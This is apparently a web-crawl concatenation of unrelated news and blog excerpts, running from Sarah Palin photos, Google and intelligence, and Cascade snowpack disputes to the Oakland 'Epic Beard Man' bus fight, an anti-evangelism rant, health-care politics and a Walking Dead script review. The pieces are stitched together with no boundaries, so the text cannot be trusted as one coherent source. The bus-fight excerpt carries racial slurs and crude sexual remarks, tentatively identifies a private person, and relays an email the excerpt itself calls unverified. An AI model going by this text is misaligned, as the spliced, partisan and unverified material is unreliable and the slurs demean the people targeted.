The Palin issue contains what LeGrice said are family pictures of Palin not previously published by a magazine — including her as a child with her siblings and a dead bear bleeding over a stump ; picking through shot white birds ; holding a cardboard box of fish freshly caught at an ice hole ; and with moose antlers still attached to a fragment of bloody skull .
It also shows her as cute and chubby little girl with glasses , the lone brunette among three blond and sandy - haired siblings .
" I want people to know what I stand for and judge me on that ... read in my own words who I am .
Do n't believe the things that are made up , " the magazine quotes Palin as saying .
There are officially two jobs left in journalism : Sarah Palin 's pundit job on Fox , and the unnamed freelancer who mimics her voice for this . [ 44 ] [ Pic via ]
In 2008 , writer Nicholas Carr worried in The Atlantic that the search engine Google and the easy availability of information on the internet is making our brains lazy -- and rendering humans stupid .
He wrote that the net was destroying his capacity for concentration and contemplation , adding , " Once I was a scuba diver in the sea of words .
Now I zip along the surface like a guy on a Jet Ski . "
DISCOVER 's own Carl Zimmer responded by taking the opposite stance , and declaring that Google is making us smarter .
He argued that humans are " natural born cyborgs " and the internet is our " giant extended mind . "
He wrote that there was " nothing unnatural about relying on the internet — Google and all — for information ....
Nor is there anything bad about our brains ’ being altered by these new technologies , any more than there is something bad about a monkey ’s brain changing as it learns how to play with a rake . "
Now , a new survey from the Pew Internet & American Life Project agrees with Zimmer ; it found that Google is indeed making us smarter by allowing us to make better choices .
More than 76 percent of the 895 experts polled said Nicholas Carr was wrong in thinking that Google made us stupid .
PC Magazine reports :
" Google allows us to be more creative in approaching problems and more integrative in our thinking .
We spend less time trying to recall and more time generating solutions , " said Paul Jones of ibiblio.org at the University of North Carolina Chapel Hill .
" For people who are readers and who are willing to explore new sources and new arguments , we can only be made better by the kinds of searches we will be able to do , " wrote Oscar Gandy , a professor at the University of Pennsylvania .
" Of course , the kind of Googled future that I am concerned about is the one in which my every desire is anticipated , and my every fear avoided by my guardian Google .
Even then , I might not be stupid , just not terribly interesting . "
Nicholas Carr meanwhile said he " felt compelled to agree with himself , " telling the Pew Project :
" What the Net does is shift the emphasis of our intelligence , away from what might be called a meditative or contemplative intelligence and more toward what might be called a utilitarian intelligence .
The price of zipping among lots of bits of information is a loss of depth in our thinking . ”
Peter Norvig , Google 's research director , argued in turn that because Google makes so much information available instantly , it 's a good strategy for a knowledge - seeker to skim through many offerings first to get an overview .
Then the user can settle down with the best sources for a deeper read .
He added that skimming and concentrating can and should coexist .

Tinnitus is a term used to describe a persistent ringing in the ears .
It can have a variety of causes and there is currently no single treatment that will cure all forms of tinnitus .
There are , however , several things you can do to significantly reduce the sound of your tinnitus , and in some cases , eliminate the sound completely .
In this article I highlight 5 tinnitus treatments that , as a tinnitus suffer , I think are effective yet have n't received the media attention they deserve .
Some of the treatments apply to only certain types of tinnitus , while others apply to all types of tinnitus .

In a matter of months , both leaders of the Qaeda - allied Taliban in Pakistan have been targeted and killed by US drone attacks .
The latest was in retaliation for the murder of CIA officials in a suicide attack by a double agent who turned on the US .
If you add this record - and there are many examples of similar surgical strikes decapitating Qaeda figures in the last year - to the ramp - up of forces in Afghanistan and overhaul of strategy there , I think you can make a very solid case that in the war on Jihadist terrorism , Obama is proving far more effective - in both soft and hard power - than the Bush administration ever was .
The Republicans will not concede this , because their war is not really at this point on al Qaeda .
It 's on Obama .

' Cause one solid Glee insider tells me that Neil is playing a character who is " really funny and really mean . "
I 'm told he will be " much more of the Dr. Horrible variety than Doogie Howser , M.D. "
Legend ...ary !
So it seems Glee 's writers are smartly honing in on their comedy sweet spot : deliciously devious characters who can deliver those breathtaking LOL one - line zingers .
( See : Jane Lynch , and now Molly Shannon , who is rumored to be playing an enemy to Sue . )
So where does Neil 's guest spot now stand ?
" When the news first broke that Neil was coming on , " one Fox insider says , " it really was n't happening at that point and nothing was written .
But things changed fast , as they do . "
That said , we 'll know more details when the ink on Neil 's ep has dried .
But the good news is that the ink has definitely dried on his contract , and we 'll get the great flavors of NPH and Glee together in very late spring .
Wikipedia defines the fractal art as calculations of fractal objects that are processed and the calculation results are presented as still images , animation or other media .
The idea behind fractal art is that calculations and equations can produce great artwork and creative inspirations as well as the tools in the artist ’s hand .
Although , fractal art may not include specific artistic topic , it provides deep inspiration source to fuel your ideas with the great and may be randomly generated combination of colors and shapes .
When you focus for a while in fractal art work , you may see shapes that never been and color balance ideas based on your personal experience and what you can imagine when you look at a fractal art work .
In this article , I will share with you different fractal artwork inspirations .
Meanwhile , I would like to share with you fractal artwork for one of the inspired fractal artists Jock Cooper .
Fractal Recursions of Jock Cooper Jock Cooper is one of the talented fractal art and fractal animation artists , during his experience with fractal design animation , he did not just produced many fractal artworks , but also he changed our view to this type of art .
He is the writer for Fractal Recursions , a collection of his fractal artwork .
Below , we will start our journey in the fractal art work with an amazing collection of Jock fractal artwork .
Please note that Jock Cooper artwork that are shown below are under the copy right :

Now , lets check other creative fractal artwork amazing collection from different artists over the web .
You can notice that fractal art has different styles and methods to treat the shapes , colors and balance to form different output .
Recently a graph of snow pack data from the NorthWest United States was brought to my attention .
There has been much ado about the loss of this fresh water source due to nothing other than global warming .
Here ’s a quote from a Real Climate article authored by Dr. Eric Steig Link HERE .
The Seattle city mayor , Greg Nickels ( a well known advocate for city - based CO 2 reduction initiatives ) wrote in an Op - Ed piece in the Seattle Times
The average snowpack in the Cascades has declined 50 percent since 1950 and will be cut in half again in 30 years if we do n’t start addressing the problems of climate change now .
That snow not only provides our drinking water , it powers the hydroelectric dams that keep our lights on .
The reply from Dr. Steig
The number “ 50 percent decline ” apparently comes from a statement in an Oregon State University report in 2004 signed by many Northwest Scientists .
This is not actually the best estimate for average snowpack decline , according to published work by Phil Mote , of Climate Impacts Group at the University of Washington .
Mote reviewed the Oregon report back in 2004 and pointed out that the 50 % figure was erroneous .
Mote ’s 2003 paper in Geophysical Research Letters , highlighted in Science a few years ago , cited losses “ as great as 60 % ” in some locations .
Subsequent work ( Mote et al. , 2005 ) attempted to quantify change in total snowpack for the Cascades , and arrived at 15 - 30 % for the period 1950 - 1997 . .
This remains the best estimate , even when including the time period up to the present .
Furthermore , this number represents measurements at many different elevations .
If high elevation stations are excluded , the declines are generally larger , as would be expected if the chief culprit is increasing temperature , rather than declining snowfall .
The issue has grown ever larger due to disagreements between scientists over the actual trends .
Oregon State climatologist George Taylor was forced to resign and Washington State climatologist Mark Albright was actually fired for making a ‘ stink ’ about certain statements in contradiction with the data .
Phil Mote who was embroiled in the controversy and was recently appointed to Oregon State ’s top climate position has been towing the global warming line .
It was George Taylor the previoius Oregon State Climatologist who first questioned the 50 % decline .
As is too often the case in climate science , the actual data is very noisy by nature yet tells quite a different story .
Below are a few plots of individual stations measuring snow pack .
shows the period of record through 2006 . “ ]
These plots are of specific stations , however they demonstrate that at least for the above locations the 1950 - 1997 trend is a cherry pick , nothing more .
If you ’re interested in the detail , I found the last link quite informative .
Before moving on , here is a comment from Joe # 21 in the Real Climate article linked above which shows the over politicized nature of snow pack rather clearly .
One item that you did n’t mention in your summary of the UW dispute is that ( at least according to the Seattle Times article ) Phil Mote apparently tried to squelch debate by insisting on reviewing all e-mails issued by Albright on the snowpack issue .
When Albright refused , Mote banned him from associating with the state climatologist ’s office .
Squelching disagreement is all too common in climatology .
Anytime there appears to be too much consensus , there is likely an unnatural cause .
Here ’s what else Dr. Steig had to say regarding Mark Albright ’s reaction to the 50 % decline in snow pack :
Both the local and national media were thus quick to jump on the “ story ” when another UW staff member , Mark Albright , sought to correct the 50 % number in a series of emails to the Mayor ’s office , among other places .
Unfortunately , Albright did n’t simply provide the corrected information , but set up a web site entitled “ The Myth of the Vanishing Cascade Mountain Snowpack ” , with the very clear message that snowpack has not declined at all .
Beyond the appearance of a controversy , this makes for a good newspaper story because it appears to cast doubt on Mote ’s credibility .
Eric Steig ’s questioning of Mark Albright ’s credibility rather than demonstrating the data has an effect on my opinion of Dr. Steig .
Perhaps he has superior knowledge to other experts who we would expect are quite qualified to have opinions on the actual data but you ’ll note the RC article above presents no actual data however there are links to a few papers .
Instead , Dr. Steig gives three reasons for his improved understanding over Mark Albright and George Taylor starting with this admittedly Jeff - like statement .
So has Pacific Northwest snowpack declined ?
Emphatically yes .
I say “ emphatically yes ” for three reasons .
# 1 :
First , because Albright illustrates the supposed lack of a trend by comparing specific periods ( e.g. 1940 -1949 vs. 1997 -2006 ) , in which snowpack has increased in some locations .
This is not very informative , because both the spatial and temporal variability is large , and any question of decline can only be correctly addressed using all the data together , and over a statistically significant time period ( 30 years or more would be preferred ) .
The first Steig example demonstrating snow pack decrease is because Mark Albright ’s actual data was n’t convincing ???
Of course this does n’t add weight to the snow IS decreasing argument either way so we need to read on .
I bolded the 30 year minimum limit comment because it ’s a humorously repetitive and very nearly arbitrary refrain in climatology .
Eric
Steig did follow it up with a link to an amazingly un-detailed report of snow ice decrease by Phil Mote mentioned above , however while filled with opinion and conclusion , there is absolutely no real information I can find in it — summary statement .
The second point Dr. Steig makes is a bit of a kluge as well .
Second , “ yes ” , because lost in the media focus on controversy over the exact number is the fact that even a 15 % decline would be huge .
( my bold )
And :
Using a starting point of 1950 gives you about 30 % .
Either way , these are big numbers , and represent anything but a trivial change for water resource planners , backcountry skiers , and fisherman ( not to mention fish ) .
So Dr. Steig determined a 30 % decline in snow pack by some numbers he ’s not referenced .
The decline sounds substantial but we do n’t have the source again for this information as no specifics were given .
Well the third reason was n’t any better .
Third , “ emphatically ” because the snowpack will very likely continue to decline in the future .
In his summary statement , Hartmann notes that “ temperatures in the … Cascades will increase in the future as a result of global warming … and it is expected that this , by itself , should result in further decreases of snow … particularly at lower elevations . ”
So we have all together the reasons for snow decline being obvious , 1 - Albright did n’t prove anything , 2 – Media or an apparently arbitrary 30 % decrease in snow pack number or 3 – we know that in the future the earth will warm so it must be true .
Pretty weak reasons to question Mark Albrights credibility in my opinion .
The tone of the debate ( which does exist ) in climate science is ugly .
So recently a graph of a QC ’d version of the snow pack is in review at the Journal of Climate , has been made public by Mark Albright .
The data for the graph is HERE and HERE with general documentation of the sources HERE and HERE .
Here is the plot Dr. Eric Steig ’s requested of 30 years of snow pack data trends in Washington and Oregon .
So , now that the 30 year trend has been updated , I expect Dr. Steig would like to revise and extend his remarks .
After all if a 15 percent decline is huge ( which from the data does n’t seem reasonable ) , what about a 15 percent increase !
Either way that ’s not the end of it because the politicians are of course involved .
Here ’s a link to a letter written on June 22 , 2009 by the not terribly conservative Governor Christine Gregoire of Washingtion in support of the obviously flawed notion of cap and trade legislation .
The letter was apparently sent to the House of Representatives .
In it she claims the following :
Last month , a study released by the University of Washington shows we ’ve already lost 20 % of our snow pack over the last 30 years .
What does that mean for Washington ?
– Millions of our citizens rely on snowmelt for drinking water .
–
Our multi-billion - dollar agriculture industry needs the water stored in snow pack to irrigate crops that feed our families and our economy .
–
That same water feeds the rivers and streams that nurture the salmon we rely on for food and commerce .
–
Less water means problems for our clean hydropower system , which provides more than 60 % of our region ’s electricity .
Link to the governors letter with some responses included HERE .
Currently all the detail behind the above 30 year trend is unavailable as it is embroiled in a battle to be published by the Journal of Climatology .
If it does n’t make it through , we ’ll have to think of another way to make it public knowledge . 😉
Christine Gregoire
The housing 102 of the tablet of device also contains electronic components that provide a number of operations and features , such as memory access , communications , sound , power , etc .
In addition , the tablet houses electronic components that are used to control operation of the display 110 and the bezel .
In one example , the tablet can be a picture frame having memory for storing digital pictures and for viewing on the display .
In another example , the tablet can be a digital media device having the display 110 , the touch sensitive bezel , and lacking most or all buttons or similar physical controls on the housing 52 .
In other examples , the tablet can be an electronic game , a personal digital assistant , a multimedia device , a cellular telephone , a portable video player , a portable navigation device , or the like .
The bezel is touch sensitive and is used to obtain touch data from the user in response to touch events made by the user on the bezel 120 .
The tablet uses the touch data obtained with the bezel to perform various operations and functions related to user interface and user control of the tablet .
For example , the touch data obtained with the bezel can control what is displayed on the tablet such as what files are played , what the volume level is , what the settings for the display are , etc .
Visible or Invisible Bezel Touch Areas
During the tablet 's operation , areas or locations of the bezel are designated for various user controls of the tablet .
In one embodiment , particular user controls designated for areas of the bezel may be indicated directly on the bezel itself using graphics , words , or the like .
In another embodiment , particular user controls designated for areas of the bezel may not have any visual indications appearing directly on the bezel itself .
Instead , the designated user controls may be in a logical or predetermined location on the bezel that the user may know or expect .
In one example , one edge of the bezel that is about 4 to 5 - inches in length may accommodate about one - hundred distinct areas that can be designated for user controls .
See the illustration of such below in Apple 's patent FIG .
13A which illustrates an embodiment of a touch sensitive bezel having a plurality of conductive pads , a control module , and sensors according to certain teachings of the present disclosure .
Shifting Orientation of the Tablet Alters the Visual Guides
In a further embodiment , the electronic device may be capable of rotation as with the iPhone , iPod touch and iPad today .
Based on the sensed orientation , the areas 121 on the bezel designated for the user controls can be altered or relocated to match the current orientation of the device .
As noted earlier , the punchy old man who likes to deliver beat downs on Oakland bus riders appears to have been identified and it was not , as they say , " his first rodeo . "

The ID is not definitive , but observers on the web believe that the " I am a motherfucker " in question is Thomas Bruso , who was arrested at an Oakland A's game last year after a confrontation with police .
He 's seems a little bit thinner and a lot more aggressive , but it may be the man alternately known as " Tom Slick , " " Vietnam Tom " and now " Epic Beard Man . "
He has been known around the Bay Area for many years and one local blogger described him thusly :

Back in 1996 , I was working at the intersection of 2nd & Market .
Each and every day the man pictured above would walk by my shop , wave a loaf of sourdough in my face , and scream obscenities about the San Francisco 49′ers .

He is also the type of guy is that lies about his age to make himself seem older .
( The police reports from the ballgame arrest lists him as 64 . )
Who knows what his military background or current mental status is , but he definitely seems a little unstable and very , very strong .
And also a new hero to anyone who has been harassed on public transportation .
Here 's another video that appears to be taken shortly after the bus incident .
The boys at 4 Chan have allegedly launched a campaign to get his tote bag back from the camera - person who took it , even though she actually spoke up and claims she gave it back , and it may not have actually belonged to him in the first place .
Details are not exactly solid on this story .
But we 'll leave you with this completely unverified email from someone who really likes to call people " cat " and consider it a tribute to " Tom Slick , " while hoping that no one has to cross paths with his fists again .

So this about the " I am a Motherfucker guy " on the Oakland bus .
I saw this cat that day .
Here 's what he was up to just before the incident :
So I 'm waiting on the NL bus to San Francisco on the corner of Fruitvale and MacArthur in East Oakland ( not ghetto East Oakland ) .
It 's a good neighborhood .
Anyway , it 's a beautiful day and I had to go to work .
So I arrive at the bus stop at 1:35 pm .
The bus leaves at 1:45 pm .
The weather is gorgeous .
Not a lot of people out .
A sleepy day .
There are three Mexican kids at the bus stop as well .
The kind of kids that try so damn hard to be street but just can't quite pull it off : " nigga " this , " nigga " that , " ya feel me " .
It was funny , yet a little sad .
So out of nowhere I see this cat in a Santa Claus Silver beard come bombastically walking towards the bus stop .
This cat was LOUD .
He walks up to the kids and it looked for a second as they might have been getting off on the wrong foot but it was just that they were got a kick out of his " I am a Motherfucker " shirt .
When I saw it , I laughed too .
IAAMF guy pulls out a pack of generic menthol 100's cigarettes and gives one to the 3 Mexican kids to share .
Then he puts on a show .
He telling everybody how hard he is ( in a funny / jovial way ) .
I believed him .
He 's yelling how he got his ass beat by 6 Black guys in Chicago for wearing an A 's hat .
It was in the bathroom and while he was pissing , he got hit over the head with a bottle .
He also talked about the time he got beat up by the cops in NYC and that 's why he was yelling at the " pig " OPD who was across the street in his patrol car .
The Mexican kids were loving it .
I kinda was too .
He then goes on about how " high " he is and that he just " smoked some of the best shit in town " .
Then he talked about ( when I say " talk " , I mean very loud almost yelling ) wanting to get " some pussy " .
I laughed and he walks over and gives me a high five .
He goes on to say that he 's hung like a mule and that " even guys want to suck my dick " .
I believed THAT .
This is all great street theater .
So it 's about 3 - 5 minutes before the bus comes and he spots this cat across the street .
This guy is a famous shoe - shiner in the City .
I know the guy .
IAAMF guy yells and runs across the street .
He almost got killed in the process as he did n't look both ways and seriously ALMOST got hit .
I 'm thinking this guy really is a MOTHERFUCKER .
Apparently IAAMF did n't have enough money for the $ 4 transbay fare ( I know , rip off ) so he got some cash from shoe - shine guy .
I guess they " go back 20 years man " .
That Brown Bag that you see on the bus that the ghetto kids say " let 's go through it " was actually IAAMF guy 's buddy 's bag .
Yes he had a friend .
His friend never said a word and he did n't have his bus fare either .
So when the bus came IAAMF guy could n't get on it .
My guess :
They scrounged some bus fare and hopped the next bus .
In closing , in The Town you have a lot of these young / not so young black kids that fuck with white people on the bus .
Not just any white guy but white guys that seem vulnerable to them .
Just the other day there was this guy that looked like Tug Speedman 's character in Tropic Thunder .
The mentally challenged guy .
He got fucked with on the bus .
It was n't cool .
There is also a " slow guy " that 's a neighborhood guy whom I 've seen get fucked with .
I think this guy and his crew thought IAAMF guy was an easy target too hence the " beat his white ass " remark .
You never know who you 're fucking with .
That cat had it coming to him .
Thanks for your time ,
Chuck

What For
I ’m Pissed .
You see , the other day I found a video showing Christian ’s in India being beaten and stoned to death .
According to this video the reason they are being beaten and stoned is solely because they are Christians .
The video featuring the pastor of Cornerstone Church , Francis Chan , is located here .
* Warning :
This video contains very disturbing and graphic images , if you are offended by violence , blood , or evangelism you should not watch this ( nor should you read the Bible ) .
( Video ’s will be put back up once they are back online See bottom of post for explanation . )
Now , please understand that I have major problems with anyone being beaten , stoned , or otherwise oppressed for any reason whatsoever and I in no way am condoning the actions of the attacking mob that carried out these heinous acts .
What they did in the video was wrong and there is absolutely no defense for it , these individuals should be found out and put in prison for the rest of their miserable lives .
There are , however , two groups of individuals that should be held directly responsible for these lives .
If the claims of Mr. Chan are correct , and these people are indeed being beaten simply because they are Christians ( no evidence is given to show that they are Christians , but for the sake of argument we can assume it is true ) I have a real big problem with both groups .
The second group of people responsible for these atrocities are none other than the evangelists and missionaries and the churches and individuals that sponsor them that convert these people into Christianity , even going so far as to do so with the knowledge that their converts may very well be killed because of their new found faith .
These wretched people use fear and blinding emotion to bring people “ to Christ ” and claim to do so out of love .
The victims of evangelism in India , fearing eternal torment as taught to them by these evangelists , lose all sense of self - preservation in the midst of being beaten to death .
They fear that if they deny Christ that he will deny them ( Matthew 10:33 ) and they will be plunged into everlasting fire and torment .
These victims are given a no win situation , wherein they could live here and now or spend eternity in hell … most of them choose death now for heaven later and this is where our problems begin .
If there were some sort of guarantee of heaven and hell , some way for the evangelist to prove that this life is not the only one we have and that Christ provides the only entrance into heaven ( and thereby the only escape from hell ) , then I could understand the role they play .
The truth is that these Jesus salesmen are unable to prove any of their claims , but the fear they hand out is so pervasive that the logical individual is often unable to resist crumbling at the feet of a god they are unable to see .
They are selling a product that is more like heroin than anything else in that it provides temporary comfort from reality but ruins their lives externally – and the addict would rather die than give up their addiction .
These converts are put through hell on earth and in return are rewarded with absolutely nothing .
We shout about burden of proof often , but here is where it matters the most .
The burden to prove this drivel before you go out and destroy lives with it should never be ignored .
If someone threatens me with hell and I convert I wo n’t be stoned for it , but when you spread this cancer to those that will bear a punishment here and now you have crossed the line from harassment to murder .
Terrorism is the use of extreme fear or anxiety to coerce participation or alignment with an idea , this definition is absolutely synonymous with hell - centric evangelism .
The blood of these poor people is not only on the hands of their attackers , but on those that strip them of the good sense they need to avoid this , those that terrorize them into accepting these beatings as a part of following Christ .
The people that sold the victims this bill of goods might as well be swinging the clubs and throwing the rocks themselves .
Evangelism is Murder .
Evangelism is Terrorism .
Update :
Moments before I completed writing this post the video ’s in question were taken down , when they come back up I will post them again .
It seems , as I was already concerned about , that the publisher is n’t positive that these are actually Christians being tormented … no real context is given to lead you to believe that they are other than the words of the pastor speaking in the narrative .
Regardless of this , knowingly proselytizing any person that you know may be at risk for their life if they convert is tantamount to murder .

President Obama told ABC
News anchor Charles Gibson that the federal government " will go bankrupt " if Congress does not pass a health care bill , among other problems .
" If we do n't pass it , here 's the guarantee , " Obama said .
" Your premiums will go up , your employers are going to load up more costs on you ...
Potentially they 're going to drop your coverage , because they just can't afford an increase of 25 percent , 30 percent in terms of the costs of providing health care to employees each and every year . "
He added that the costs of Medicare and Medicaid are on an " unsustainable " trajectory and no is action taken to bring them down , " the federal government will go bankrupt . "
The interview aired tonight on ABC's World News Tonight .
Obama spoke as Senate Democratic leaders struggle to find the 60 votes necessary to move a health care bill forward .
Republicans are planning a filibuster , saying the plan gives the government too much control over the health care system and will lead to higher insurance premiums and doctors ' bills .
Rep. Tom Price , R - Ga. , chairman of the House Republican Study Committee , said the White House is making it " abundantly clear they will say and do anything to pass a health care bill .
Desperation does not change the fact that this bill will do nothing to bring down health care costs for Americans . "
Obama said cost is a major reason for passing legislation .
" If we do n't do this , nobody argues with the fact that health care costs are going to consume the entire federal budget , " Obama told Gibson , the ABC anchor who is retiring this week .
Even if ( when ? ) the Senate passes something , it must resolve differences with a House health care bill -- and House Speaker Nancy Pelosi appeared to express doubt today on whether a final product would ready by Obama 's State of the Union address , which is expected in late January .
Oval colleague Kathy Kiely gives us Pelosi 's take here at our On Politics blog .
( Posted by David Jackson )
In case you missed the reaction to Robert Gibbs ' lighthearted mockery of Sarah Palin's " telepalmter " , the White House press corps has a new rule .
NBC's Chuck Todd , who previously defended Palin by declaring , " We 've all done notes , " protested Wednesday " I was surprised by the stunt myself . "
In her report , CNN 's Suzanne Malveaux groused , " so much for changing the tone . "
Apparently , for this Democratic White House to jokingly respond to bitter attacks from former ( or wannabee ) Republican vice presidents is undignified and out - of - bounds .
Of course , President Bush and his spokesmen could mock his opponents with impunity .
Chip Reid of CBS introduced this species of right - wing water carrying in March during the unprecedented barrage of attacks on Obama from former Vice President Dick Cheney .
After Cheney first began his campaign to essentially label Obama a traitor ( " he is making some choices that , in my mind , will , in fact , raise the risk to the American people of another attack " ) , press secretary Robert Gibbs joked , " Well , I guess Rush Limbaugh was busy , so they trotted out their next - most popular member of the Republican cabal . "
On March 16th , that was more than CBS White House correspondent Reid could countenance :
REID : Can I ask you , when you referred to the former Vice President , that was a really hard - hitting , kind of sarcastic response you had .
This is a former Vice President of the United States .
Is that the attitude -- is that the sanctioned tone toward the former Vice President of the United States from this White House now ?
GIBBS : Sometimes I ask forgiveness rather than for permission , Chip .
But no , I hope my sarcasm did n't mask the seriousness of the answer with which I addressed Ed -- that for seven - plus years , the very perpetrators that the Vice President says he 's concerned about were n't brought to justice .
Of course , Reid 's ventriloquist act for the Republican Party began almost the moment Obama took the oath of office .
When every Republican member of the House and all but three in the Senate voted against the $ 787 billion stimulus bill , Reid essentially blamed the President , asking Obama if " your White House is moving away from this emphasis on bipartisanship . "
And before he warned of " Democrats also raising their ugly heads , " Reid asked President Obama about his posture on Iran , " Were you influenced at all by John McCain and Lindsey Graham accusing you of being timid and weak ? "
In sharp contrast , the whoring on behalf of the GOP during the Bush administration was n't limited to the presence of Jeff Gannon in the White House press room .
When press secretary Tony Snow or President Bush himself mocked his critics , that was just fine .
For his part , Tony Snow like President Bush repeatedly resorted to the childish " Democrat Party " taunt so beloved by Republicans since the days of Ronald Reagan .
But his stunning mixture of arrogance and cynical humor hardly ended there .
Asked about James Comey 's testimony that Alberto Gonzales in March 2004 tried to coerce Attorney General John Ashcroft , then bed - ridden with a pancreatic condition following gall bladder surgery , into approving President Bush 's regime of illegal domestic surveillance , Snow joked :
" Trying to take advantage of a sick man .
Because he had an appendectomy , his brain did n't work ? "
Three weeks after proclaiming " We did n't create the war in Iraq , " Snow on the fourth anniversary of the invasion told CNN's Ed Henry to " zip it " when Henry asked him to explain the Bush administration 's " recipe for success . "
On the subject of Iran , the late Tony Snow was particularly dismissive of President Bush 's critics .
After declaring in January 26 , 2007 , " The Iranian people are more pro-American than any American university faculty , " Snow the next month blasted Democrats suspicious of President Bush 's saber rattling towards Tehran :
" It is interesting to me that it seems that some politicians maybe are trying to protect Iran . "
In May 2007 , Snow directed the " sarcastic tone " Chip Reid would later decry at former Vice President Al Gore .
When Gore in book The Assault on Reason correctly and accurately labeled as a " deception " the Bush administration 's efforts to link 9/11 to Iraq , Snow sneered :
" I do n't know if they 're going to do a reprinting of the book to try to get the facts straight .
The fact - checkers may have to take a look at it .
These are highly complex publishing issues and I can't be an expert on them . "
Of course , when it came to the facts about the war in Iraq and Saddam 's weapons of mass destruction , President George W. Bush was ( or should have been ) an expert .
And for Bush , it was all a laughing matter .
Bush 's presentation at the 2004 Radio and Television Correspondents Association Dinner also showed his contempt for the truth and the suffering of the American people .
His tasteless White House slideshow made light of the lack of weapons of mass destruction in Iraq .
Coming one year and hundreds of American dead and wounded after the invasion of Iraq , President Bush the cut - up hoped to regale the audience with his White House hijinx .
As David Corn of The Nation reported :
Bush notes he spends " a lot of time on the phone listening to our European allies . "
Then we see a photo of him on the phone with a finger in his ear .
But at one point , Bush showed a photo of himself looking for something out a window in the Oval Office , and he said , " Those weapons of mass destruction have got to be somewhere . "
The audience laughed .
I grimaced .
But that was n't the end of it .
After a few more slides , there was a shot of Bush looking under furniture in the Oval Office .
" Nope , " he said .
" No weapons over there . "
More laughter .
Then another picture of Bush searching in his office : " Maybe under here . "
Laughter again .
That , for the White House press corps , was hilarious .
But now that a Democrat is in the Oval Office , humorous jabs at Obama 's critics from the President and his press secretary apparently are n't funny more .

Is there such a thing as having too much dead people in your entertainment quota ?
The answer to that question will only be known if AMC decides to give a greenlight to a TV series based on Robert Kirkman 's ongoing comic book series about life after the zombie apocalypse , The Walking Dead .
If you have n't been paying attention , the 2000s saw the zombie finally rise to mainstream status with a horde of well - received movies in this monster genre : the Resident Evil films ( with a fourth now in production ) ; a remake of Dawn of the Dead ; 28 Days Later and its sequel which gave the idea of a slow moving corpse a twist with its fast runners ; zombie comedies Zombieland and Fido ; and the return of the father of modern zombie cinema , George A. Romero , with two new ghoul films , Land of the Dead and Diary of the Dead ( and there 's a third forthcoming , Survival of the Dead . )
With all of that box office success one would think that television executives would be looking to cash in on the zombie hype and get a TV series on the air .
Actually , one network did try : back in 2007 CBS ordered a pilot called Babylon Fields which could be best described as a drama set after the dead return from the grave .
After viewing the pilot the network decided that the show did n't fit in with the network 's fall schedule , and so a series was never ordered .
So much for zombies on the tube , right ?
Well , not really .
Just like any good zombie it's hard to keep the idea of a zombie TV series dead and buried .
Last summer the rights to Kirkman 's Walking Dead were sold to AMC .
Fans of the book may have felt somewhat reassured when it was also mentioned that Frank Darabont would be directing the pilot , as well as writing the pilot 's screenplay and serving as an executive producer on the show .
The director of The Shawshank Redemption , The Majestic , The Green Mile and The Mist , Darabont was also a producer on a proposed sequel to The Thing , the 1982 John Carpenter movie .
Unfortunately that four - hour mini-series never got further than the screenplay stage , but when I reviewed it last year , I found the script to be an outstanding idea for a continuation of The Thing .
If Darabont could bring some of that quality found in the Thing mini-series sequel to The Walking Dead TV show , then AMC's Mad Men audience may be in for a real ride .
Only as recently as last week did AMC order a pilot to be made from Darabont 's Walking Dead screenplay .
If the cable network likes what they see then there 'll be a Walking Dead TV series coming as soon as this fall or perhaps around the start of 2011 .
So , here is the big question : does Darabont 's Walking Dead pilot have the necessary ingredients to be not just a decent horror TV series but a good drama ?
The answer : Yes , it does .
Contained in Darabont 's 60 - page pilot script are all the elements to make the show a success .
There 's plenty of horror that happens in those 60 pages .
The director 's script covers the broad range of the zombie horror emotional spectrum , such as giving us moments of extreme gore ( hey , any zombie TV show would n't be a zombie show if it did n't have folks being munched on ! ) , moments of shock value ( hey , you did n't think that there was a zombie hiding behind that car , did you ? ) and the moments that I believe are the best indicator that The Walking Dead TV series has what it takes to transcend the boundaries of being simply labelled a horror show , the psychological horror scenes .
Those scenes are the hammers that you 're going to remember and the ones that are going to propel this show to be viewed as something more important than just a scary show .
If you 're familiar with the beginnings of the comic then you 'll be on familiar ground when you watch the pilot episode , even though it would appear that Darabont is n't interested in making a direct adaptation of the comic book 's origin story .
Our hero is Officer Rick Grimes , a deputy for a small Georgia town outside of Atlanta .
About 15 pages into our story Grimes is involved in a police incident where he receives a near - fatal injury .
After being taken to the hospital and falling into a short coma , our law enforcement man awakens to find the hospital empty and the telltale signs that something very bad has gone down while he was out .
The way that Darabont chooses to introduce Grimes to the post - zombie world is nearly identical to the opening moments of Danny Boyle 's 28 Days Later but it 's forgivable ; the impact of the changed world is that much more heightened with Grimes serving as our introduction to it .
From there Grimes tries to find his family , his wife Lori and their young son Carl .
He returns to his home and finds the neighborhood deserted , his wife and son gone .
Still not fully comprehending what 's happened , Grimes is saved by another father and son who have taken up shelter in a neighbor 's house .
From these two survivors Grimes learns about the zombie plague and the rules of life : if you 're bitten , if a zombie so much as scratches you , you become infected , you die and then you become a zombie yourself .
We 're also shown some of the rules of the game that the Walking Dead zombies adhere to : there are " walkers " , the ones that slowly come up to you .
The walkers are slow and a head shot will take them out .
That said , there 's a lot of walkers out there and if they decide to come at you at once , save that last bullet for yourself , you dig ?
From his new neighbors Grimes is told that his family may have decided to head into Atlanta where the government was setting up a safety zone .
With that info , Grimes heads off by himself and makes his way into the city .
What happens in the next 20 - or - so minutes is pretty intense for our hero and I want to leave it for Darabont to show to you .
I 'm not sure if Darabont is the kind of guy that puts in camera effects into all of his screenplays but in his Walking Dead script there are a couple of places where he describes the visual tricks that he wants to do to heighten the surreal nature of a scene .
There 's a moment where Grimes is in a tough situation and has to fire a pistol at close quarters at a zombie .
In the environment that he 's in , Grimes is momentarily deafened by the blast .
In Darabont 's script , the description of what we the viewer should experience to communicate the deafness is in there .
Reading that sort of scene as well as a few others like that made me more interested in seeing what Darabont 's visual style is going to be in this show .
If you were a fan of the comic book before , now you know that the pilot 's set - up of the Walking Dead story follows a similar arc as the comic 's but it 's not exact .
I 'd guess that about half to two - thirds of the first two issues are contained in the pilot episode but there 's also new material .
For instance , we now get to see the incident that brought Grimes to the hospital ( the comic begins with him coming to in his deserted room ) and there 's some changes with what happens when he is in Atlanta that differ with the comic 's depiction of events .
[ Editor 's Note : the comic book does have a single page showing why Rick came to the hospital .
See the comments section below for more explanation . ]
Darabont seems to know what he 's doing and in the places where he chooses to include new material , with his changes / additions better serving the story and bring more characterization ( at the beginning and middle ) and intensity ( at the end ) .
In particular there was a new revelation concerning the plight of the other father that Grimes finds living in his old neighborhood that 's not in the comic .
